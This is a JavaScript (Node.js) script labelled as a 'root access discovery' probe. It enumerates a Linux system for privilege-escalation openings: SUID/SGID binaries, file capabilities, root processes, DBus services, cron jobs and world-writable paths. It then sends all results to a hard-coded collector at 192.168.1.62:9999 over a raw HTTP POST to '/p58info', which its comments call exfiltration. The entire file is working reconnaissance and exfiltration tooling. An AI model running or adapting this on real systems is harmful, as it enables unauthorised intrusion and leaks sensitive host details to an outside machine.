"use strict";

/* p58: root access discovery
   1. identity + dbspace perms
   2. SUID/SGID scan (find /)
   3. file capabilities scan (getcap)
   4. root processes (ps -ef)
   5. DBus system services (app-context manager?)
   6. cron
   7. world-writable dirs/files
   exfil /p58info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p58', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p58info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function main() {
  R.results.identity = run('id 2>&1; echo ===DBSPACE===; ls -lan /opt/ 2>/dev/null | grep -i db; stat /opt/dbspace 2>&1', 15000);

  // 2) SUID / SGID
  R.results.suid = run('find / -xdev -perm -4000 -type f 2>/dev/null', 120000);
  R.results.sgid = run('find / -xdev -perm -2000 -type f 2>/dev/null | head -30', 60000);

  // 3) capabilities
  R.results.getcap = run('getcap -r / 2>/dev/null | grep -v ":$" | head -60; echo ===FALLBACK===; for d in /usr/bin /usr/sbin /bin /sbin /opt; do find $d -type f 2>/dev/null | while read f; do c=$(getcap "$f" 2>/dev/null); [ -n "$c" ] && echo "$c"; done; done | head -40', 180000);

  // 4) root processes
  R.results.ps = run('ps -ef 2>/dev/null | head -120', 20000);

  // 5) DBus
  R.results.dbus = run('echo ===SVCS===; ls /usr/share/dbus-1/system-services/ 2>&1 | head -40; echo ===CONF===; ls /usr/share/dbus-1/system.d/ 2>&1 | head -20; echo ===GREP===; grep -l -iE "context|appinfo|RunningApps|appmgr" /usr/share/dbus-1/system-services/*.service 2>/dev/null | head -10; echo ===CAT===; for f in /usr/share/dbus-1/system-services/*.service; do echo "--- $f"; cat "$f" 2>/dev/null; done | grep -iE "context|appinfo|running|appmgr|---" | head -40', 30000);

  // 6) cron
  R.results.cron = run('ls -la /etc/cron* 2>&1 | head -20; ls -la /var/spool/cron 2>&1 | head -10; cat /etc/crontab 2>/dev/null | head -20', 15000);

  // 7) world-writable
  R.results.ww = run('echo ===DIRS===; find / -xdev -type d -perm -0002 2>/dev/null | head -30; echo ===FILES_OPT===; find /opt /usr -maxdepth 4 -type f -perm -0002 2>/dev/null | head -20', 90000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
